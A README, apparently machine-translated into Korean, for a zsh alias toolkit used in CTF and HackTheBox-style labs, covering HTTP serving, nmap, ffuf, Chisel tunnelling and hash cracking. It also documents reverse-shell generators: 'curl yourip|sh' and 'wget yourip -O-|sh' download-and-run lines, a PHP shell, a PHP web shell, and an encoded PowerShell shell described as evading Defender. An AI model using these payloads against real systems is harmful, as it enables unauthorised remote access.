# CTF, HTB, THM 등을 위한 도구  
자주 사용하는 별칭과 스크립트를 포함합니다. 이 저장소를 **홈 폴더에** 클론한 후 `echo "source ~/zsh-aliases/aliases.zsh" >> ~/.zshrc`를 실행하세요. zsh를 재시작하면 모든 별칭과 스크립트를 사용할 수 있습니다. 칼리 리눅스에서만 테스트했으며, 다른 배포판에서는 추가 종속성 설치가 필요할 수 있습니다.  
> #### 면책 조항  
> 대부분의 별칭은 아마도 형편없을 수 있으니, pepeganess를 줄이는 풀 리퀘스트 제출을 환영합니다. 저에게는 작동하는 것만으로도 충분합니다 :D  
## 기타  
### > www  

현재 디렉토리에서 포트 80으로 HTTP 서버를 시작합니다. 또한 각 네트워크 인터페이스 카드에 연결된 IP 주소 목록을 출력하고, 현재 디렉토리 경로를 보여주며 파일 목록을 나열합니다.  
예시:
```
┌──(jazz㉿kali)-[/tmp/www]
└─$ www
[eth0] 192.168.172.128
[/tmp/www]
linpeas.sh  pspy64
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
> #### 노트
> - 포트 80에서 수신할 수 있도록 sudo를 사용합니다.

### > tun0

tun0 인터페이스의 IP 주소를 클립보드에 복사합니다.
예시:
```
┌──(jazz㉿kali)-[~/jazz]
└─$ tun0 
```
클립보드 내용 이후:
```
10.10.14.41
```

### > mkdir_cd
디렉토리를 생성한 후 바로 그 디렉토리로 `cd` 하고 싶을 때가 많습니다. 이것은 정확히 그 작업을 수행합니다.  
예시: 
```
┌──(jazz㉿kali)-[~/jazz]
└─$ mkdir_cd pepega

┌──(jazz㉿kali)-[~/jazz/pepega]
└─$ 
```

## 리버스 셸
### > gen_lin_rev $ip $port 
[RSaaS](https://github.com/lukechilds/reverse-shell)를 기반으로 합니다. 현재 디렉터리에 `index.html` 파일을 생성합니다. 이 파일에는 여러 리버스 셸 페이로드가 포함되어 있으며, 하나가 작동할 때까지 순차적으로 시도됩니다. RCE를 얻은 후 리버스 셸을 쉽게 빠르게 실행하기 위해 `www`와 함께 사용할 수 있습니다. 대상이 `curl yourip|sh`를 실행하면 웹서버에서 리버스 셸 페이로드를 가져와 리스너에 연결을 시도합니다. 
예시: 
```
┌──(jazz㉿kali)-[~]
└─$ gen_lin_rev 127.0.0.1 1337
[+] Wrote Linux reverse shells to /home/jazz/index.html
```
> #### 노트
> - `curl yourip|sh` 페이로드가 공백과 파이프를 제외하고는 별다른 나쁜 문자가 없다는 점이 정말 마음에 듭니다. 공백이 문제될 경우 이를 우회하는 [방법들](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces)이 있고, 파이프는 별도로 다운로드 후 실행하여 우회할 수 있습니다.
> - 원격 머신에 curl이 설치되어 있지 않으면 `wget yourip -O-|sh`를 시도해 볼 수 있습니다.
 
### > gen_php_rev $ip $port

주어진 ip와 포트로 [PentestMonkey PHP 역방향 쉘](https://github.com/pentestmonkey/php-reverse-shell)을 생성하여 현재 디렉토리에 저장합니다.  
예시:

```
┌──(jazz㉿kali)-[~]
└─$ gen_php_rev 127.0.0.1 1337                                                              
[+] Wrote PHP reverse shell to /home/jazz/jazz.php
```
### > gen_ps_rev $ip $port
제공된 IP와 포트를 사용하여 Powershell 리버스 셸을 생성하며, 마지막 사용 시점에 디펜더를 우회했습니다. 이 페이로드의 출처는 확실하지 않습니다.  
예시:
```
┌──(jazz㉿kali)-[~]
└─$ gen_ps_rev 127.0.0.1 1337
```
클립보드 내용 이후:
```
powershell -ec JABUAGEAcgBnAGUAdABIAG8AcwB0A...
```

## TTY 업그레이드
### > uptty
python(2) 및 python3 tty 업그레이드 명령어를 클립보드에 복사합니다.
예시: 
```
┌──(jazz㉿kali)-[~/jazz]
└─$ uptty
```
클립보드 내용 이후:
```
python3 -c 'import pty;pty.spawn("/bin/bash")';python -c 'import pty;pty.spawn("/bin/bash")'
```
> #### 참고사항
> - `xclip` 설치가 필요합니다
> - `py_tty_upgrade`와 `py3_tty_upgrade`는 현재까지 포함되어 있으나 대신 이 별칭을 호출합니다

### > script_tty_upgrade
원격 머신에 Python이 설치되어 있지 않은 경우 이 명령어를 사용하여 tty 셸로 업그레이드하는 `script` 방법을 클립보드에 복사할 수 있습니다. 
예시:
```
┌──(jazz㉿kali)-[~/jazz]
└─$ script_tty_upgrade
```
클립보드 내용 이후:
```
/usr/bin/script -qc /bin/bash /dev/null
```
> #### 노트
> - `xclip` 설치가 필요합니다

### > tty_fix
`stty raw -echo; fg; reset` 명령어를 실행하며, 위의 tty 업그레이드를 사용한 후에 사용해야 합니다.

### > tty_conf
현재 tty 설정(행과 열 수)을 가져와서 클립보드에 복사하는 원라이너를 제공합니다. 이를 리버스 셸 창에 바로 붙여넣으면 해당 설정과 일치시킬 수 있습니다. 이 방법은 터미널에서 줄 바꿈이 중간에 발생하는 문제를 해결합니다.  
예시:
```
┌──(jazz㉿kali)-[~/jazz]
└─$ tty_conf               
```
클립보드 내용 이후:
```
stty rows 30 columns 116
```
> #### 노트
> - `xclip` 설치 필요

## 해시 크래킹
### > rock_john $hash_file (추가 인자)
수동으로 `--wordlist=/usr/share/wordlists/rockyou.txt` (자동 완성 불가 :/)를 인자로 제공하는 대신, 이 별칭은 해당 인자를 주입하여 JohnTheRipper와 rockyou 단어 목록을 사용해 해시를 더 쉽게 크래킹하는 데 사용할 수 있습니다.
예시:
```
┌──(jazz㉿kali)-[~/jazz]
└─$ rock_john hash.txt --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
jazz             (?)     
1g 0:00:00:00 DONE (2022-05-19 15:59) 100.0g/s 5376Kp/s 5376Kc/s 5376KC/s lynn88..ilovebrooke
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```
> #### 노트
> - Kali는 2022.2 버전에서 John의 자동 완성을 수정한 것 같습니다! 이 별칭은 여전히 약간의 수고를 덜어줍니다 ;)
## 포트스캐닝
### > nmap_tcp $ip (추가 인자)
기본 설정으로 TCP nmap 스캔을 시작하고 스캔 결과를 nmap 디렉터리에 출력합니다. 디렉터리가 없으면 자동으로 생성됩니다.
예시:
```
┌──(jazz㉿kali)-[~]
└─$ nmap_default 127.0.0.1
[i] Creating /home/jazz/nmap...
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:04 EDT
...
```
> #### 참고사항
> - 기본 TCP 포트만 스캔합니다. 모든 포트를 스캔하려면 `-p-`를 인수로 추가하세요.
> - SYN 스캔에 필요한 권한을 얻기 위해 `sudo`를 사용합니다.
### > nmap_udp $ip (추가 인수)
기본 설정으로 UDP nmap 스캔을 시작하며, 스캔 결과를 nmap 디렉터리에 출력합니다. 해당 디렉터리가 없으면 자동으로 생성됩니다. 
예시:
```
┌──(jazz㉿kali)-[~]
└─$ nmap_udp 127.0.0.1
[i] Creating /home/jazz/nmap...
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:11 EDT
...
```
> #### 참고 사항
> - 이것은 기본 UDP 포트만 스캔합니다. 모든 포트를 스캔하려면 `-p-`를 인수로 추가하세요.
> - UDP 스캔에 필요한 권한을 얻기 위해 `sudo`를 사용합니다.


## SecLists 경로

> #### 참고 사항
> - 이 툴킷의 많은 기능이 SecLists 프로젝트의 워드리스트를 사용합니다. 이 기능들이 올바르게 작동하려면 스크립트가 SecLists 디렉터리 위치를 알아야 합니다. 툴킷은 SecLists 위치를 찾기 위해 다음 논리를 사용합니다:

1. 먼저 `/opt/seclists/`가 존재하는지 확인합니다.
2. 없다면 `/usr/share/seclists/`가 존재하는지 확인합니다.
3. 이 두 디렉터리 모두 없으면 `SECLISTS_PATH`라는 환경 변수를 찾습니다.

이 스크립트와 함께 SecLists를 설정하려면:

1. 표준 위치 중 하나(`/opt/seclists/` 또는 `/usr/share/seclists/`)에 SecLists를 설치합니다.
   
   또는

2. `SECLISTS_PATH` 환경 변수를 SecLists 설치 경로로 설정합니다:

   ```bash
   export SECLISTS_PATH="/path/to/seclists"
   # You can add this line to your .zshrc file to make it permanent.
    ```

## 웹 퍼징
### > vhost $domain (-w 단어목록) (추가 인자)
ffuf를 사용하여 가상 호스트 탐색을 수행합니다.
예시:
```
┌──(22sh㉿kali)-[~]
└─$ vhost box.htb
```
> #### 노트
> - 도메인만 전달하면 http가 사용되며, https를 위해 전체 URL https://box.htb도 전달할 수 있습니다.
> - `ffuf`가 설치되어 있어야 합니다.
### > fuzz_dir $url (추가 인수)
ffuf를 사용하여 디렉토리 및 파일 퍼징을 수행합니다.
예제:
```
┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb

┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt

┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb -fs 245

┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt -fs 245
```
> #### 노트
> - `ffuf`가 설치되어 있어야 합니다
## Chisel 터널링
### > chisel_socks $ip $port
Chisel을 사용하여 SOCKS 프록시를 설정하고 명령어를 클립보드에 복사합니다.
예시:

```
┌──(22sh㉿kali)-[~/jazz]
└─$ chisel_socks 10.10.14.10 8888
[+] copied chisel client -v 10.10.14.10:8888 R:socks in clipboard
2024/08/05 23:31:03 server: Reverse tunnelling enabled
2024/08/05 23:31:03 server: Fingerprint vasHkxo+4Ec2ahPgyQ8BNqQVXOCda9cmPmP7WXRdh44=
2024/08/05 23:31:03 server: Listening on http://0.0.0.0:8888
```
### > chisel_forward $local_ip $local_port $remote_ip $remote_port
Chisel을 사용하여 포트 포워딩을 설정합니다.
예:

```
┌──(22sh㉿kali)-[~/jazz]
└─$ chisel_forward 10.10.14.10 8080 127.0.0.1 8080
[+] Copied to clipboard: ./chisel client 10.10.14.10:8888 R:8080:127.0.0.1:8080
[+] Run this on the target machine
2024/08/05 23:32:30 server: Reverse tunnelling enabled
2024/08/05 23:32:30 server: Fingerprint x2iuHfzYVOWXL/7Gw0a6AjXhMIg8WP7AqZwlDuRasQw=
2024/08/05 23:32:30 server: Listening on http://0.0.0.0:8888
```
## 호스트 관리
### > addhost $ip $hostname
/etc/hosts 파일에 항목을 추가하거나 업데이트합니다.
예시:
```
┌──(22sh㉿kali)-[~/jazz]
└─$ addhost 10.10.11.234 big.box.htb 
[+] Appended big.box.htb to existing entry for 10.10.11.234 in /etc/hosts
10.10.11.234 boss.htb big.boss.htb big.box.htb


┌──(22sh㉿kali)-[~/jazz]
└─$ addhost 10.10.11.235 newbox.htb 
[+] Added new entry: 10.10.11.235 newbox.htb to /etc/hosts
10.10.11.235 newbox.htb
```
## 추가 별칭
- `linpeas`: 최신 버전의 LinPEAS를 다운로드합니다.
- `upload`: bashupload.com을 사용하여 파일을 업로드합니다.
- `phpcmd`: 간단한 PHP 웹 셸을 생성합니다.
- `burl`: burpsuite 프록시를 사용하여 curl을 실행합니다.



---

Tranlated By [Open Ai Tx](https://github.com/OpenAiTx/OpenAiTx) | Last indexed: 2026-05-07

---